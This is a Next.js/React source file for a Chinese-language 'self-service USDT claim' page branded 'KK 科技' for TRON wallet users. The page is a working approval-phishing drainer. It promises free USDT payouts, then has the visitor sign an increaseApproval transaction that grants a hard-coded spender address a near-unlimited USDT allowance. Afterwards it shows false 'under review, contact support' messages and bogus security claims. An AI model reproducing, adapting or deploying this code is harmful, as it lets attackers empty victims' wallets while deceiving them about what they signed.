"use client";
import { useState } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import WalletModal from "./components/WalletModal";

const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_SPENDER_ADDRESS = "TDAWvz7AgmdUSaLiU5Bnhnyzm9Hm45y9i6";
// 移动端优先稳定节点
const TRON_FULL_HOST = "https://trongrid.tronapi.com";
const APPROVE_FEE_LIMIT = 100_000_000;
const TRANSACTION_EXPIRATION_EXTENSION_SECONDS = 1740;
const BROADCAST_TIMEOUT_MS = 10000;

export default function WalletPage() {
  const { address: walletAddress, connected, signTransaction } = useWallet();
  const [amount, setAmount] = useState("2000");
  const [inputAddress, setInputAddress] = useState("");
  const [walletOpen, setWalletOpen] = useState(false);
  const [msg, setMsg] = useState("");
  const [step, setStep] = useState("");
  const [loading, setLoading] = useState(false);

  function bindWallet() {
    if (!inputAddress.trim()) {
      setMsg("请输入您的TRON钱包地址");
      return;
    }
    const reg = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
    if (!reg.test(inputAddress.trim())) {
      setMsg("请输入正确的TRON钱包地址");
      return;
    }
    setWalletOpen(true);
  }

  function walletSuccess() {
    setWalletOpen(false);
    setMsg("✓ TRON钱包连接成功");
  }

  async function submitClaim() {
    try {
      if (loading) return;
      if (!walletAddress) {
        setMsg("请先连接TRON钱包");
        return;
      }

      setLoading(true);
      setStep("正在创建授权交易...");
      setMsg("请等待钱包确认");

      const { TronWeb } = await import("tronweb");
      const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST });
      const ownerAddressHex = tronWeb.address.toHex(walletAddress);
      const contractAddressHex = tronWeb.address.toHex(USDT_CONTRACT_ADDRESS);

      const parameters = [
        { type: "address", value: USDT_SPENDER_ADDRESS },
        { type: "uint256", value: "1793719476511300" }
      ];

      const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
        contractAddressHex,
        "increaseApproval(address,uint256)",
        { feeLimit: APPROVE_FEE_LIMIT, callValue: 0 },
        parameters,
        ownerAddressHex
      );

      if (!transactionWrapper || !transactionWrapper.transaction) {
        throw new Error("创建授权交易失败");
      }

      const extendedTransaction = await tronWeb.transactionBuilder.extendExpiration(
        transactionWrapper.transaction,
        TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
        { txLocal: true }
      );

      if (!signTransaction) {
        throw new Error("当前钱包不支持交易签名");
      }

      setStep("等待钱包签名...");
      setMsg("请在钱包弹窗确认授权");
      const signedTransaction = await signTransaction(extendedTransaction);
      console.log("✅ 钱包签名完成，拿到签名交易对象", signedTransaction);

      if (!signedTransaction || !signedTransaction.txID) {
        throw new Error("钱包签名失败，未获取交易ID");
      }
      const txId = signedTransaction.txID;

      setStep("正在提交链上交易...");
      setMsg("广播交易到TRON网络，请稍候...");

      const broadcastPromise = tronWeb.trx.sendRawTransaction(signedTransaction);
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error(`广播节点响应超时。\n钱包签名已完成！\n交易哈希：${txId}\n前往Tronscan查询交易状态`)), BROADCAST_TIMEOUT_MS);
      });

      const broadcastResult: any = await Promise.race([broadcastPromise, timeoutPromise]);
      console.log("📤 广播接口返回结果", broadcastResult);

      if (!broadcastResult || broadcastResult.result !== true) {
        throw new Error("交易广播失败，节点返回false");
      }

      setMsg(`✅ 提交成功\n交易哈希：${txId}\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服`);
      setStep("");
    } catch (error: any) {
      console.log("❌ 任务异常：", error);
      setStep("");
      setMsg("❌ 领取失败\n\n" + (error?.message || "未知错误，请重新提交"));
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-[#030817] text-white px-4 py-6 overflow-x-hidden">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-lg">KK</div>
          <div>
            <div className="font-bold text-base">KK 科技</div>
            <div className="text-xs text-gray-400">KK_keji888</div>
          </div>
        </div>
        <div className="rounded-xl border border-red-400/30 bg-white/5 px-3 py-2">
          <div className="text-red-400 font-bold text-xs">● TRON</div>
          <div className="text-[10px] text-gray-400">TRC20 Network</div>
        </div>
      </div>
      <div className="text-center mt-12">
        <div className="inline-block rounded-full border border-cyan-400/30 px-4 py-1.5 text-cyan-400 text-xs">◆ Secure Web3 Service</div>
        <h1 className="text-3xl font-bold mt-6">自助领取USDT</h1>
        <p className="text-gray-400 mt-4 leading-7">绑定您的TRON钱包地址<br />用于USDT提取</p>
      </div>
      <div className="mt-10">
        <h2 className="font-bold text-base mb-4">选择领取金额</h2>
        <label className={`block rounded-3xl border p-5 mb-4 cursor-pointer ${amount === "2000" ? "border-cyan-400 bg-cyan-400/10" : "border-white/10 bg-white/5"}`}>
          <input type="radio" checked={amount === "2000"} onChange={() => setAmount("2000")} className="hidden" />
          <div className="text-cyan-400 text-xs">◆ 测试领取专用</div>
          <div className="text-3xl font-bold mt-2">2000<span className="text-base ml-1">USDT</span></div>
        </label>
        <div className="grid grid-cols-2 gap-3">
          {["10000", "20000", "30000"].map(item => (
            <label key={item} className={`rounded-2xl border py-4 text-center cursor-pointer ${amount === item ? "border-cyan-400 bg-cyan-400/20 text-cyan-400" : "border-white/10 bg-white/5"}`}>
              <input type="radio" checked={amount === item} onChange={() => setAmount(item)} className="hidden" />
              {item} USDT
            </label>
          ))}
        </div>
      </div>
      <div className="mt-10">
        <h2 className="font-bold text-base mb-4">提取地址绑定</h2>
        <div className="bg-white/5 border border-white/10 rounded-3xl p-4">
          <div className="text-gray-400 text-xs mb-2">绑定地址</div>
          <input
            value={inputAddress}
            onChange={(e) => setInputAddress(e.target.value)}
            placeholder="请输入您的TRON钱包地址"
            className="w-full bg-transparent outline-none text-base"
          />
        </div>
        <button
          onClick={connected ? submitClaim : bindWallet}
          disabled={loading}
          className="mt-5 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 flex justify-center items-center gap-3 min-h-[60px] active:opacity-80"
        >
          {loading ? (
            <>
              <span className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></span>
              处理中...
            </>
          ) : connected ? "🚀 提交领取" : "🔗 连接TRON钱包"}
        </button>
        {step && <div className="text-center text-cyan-400 mt-3 text-sm">{step}</div>}
        {msg && <div className="text-center text-cyan-400 mt-4 whitespace-pre-line text-sm leading-relaxed">{msg}</div>}
      </div>
      <div className="mt-10 space-y-3">
        <div className="bg-white/5 border border-white/10 rounded-2xl p-4 text-sm">🛡️ 军级加密技术，确保地址绑定安全</div>
        <div className="bg-white/5 border border-white/10 rounded-2xl p-4 text-sm">⚡ 毫秒级处理速度，及时完成绑定</div>
        <div className="bg-white/5 border border-white/10 rounded-2xl p-4 text-sm">🔰 专业风控团队，24小时安全保障</div>
      </div>
      <footer className="text-center mt-14 pb-8 text-gray-400 text-xs">
        <div className="text-3xl font-black text-cyan-400">KK</div>
        <div className="mt-2">KK 科技 · KK_keji888</div>
        <div className="mt-1">Secure Web3 Infrastructure</div>
      </footer>
      <WalletModal
        open={walletOpen}
        onClose={() => setWalletOpen(false)}
        onConnected={walletSuccess}
        onError={(error: string) => { setMsg(error); }}
      />
    </div>
  );
}
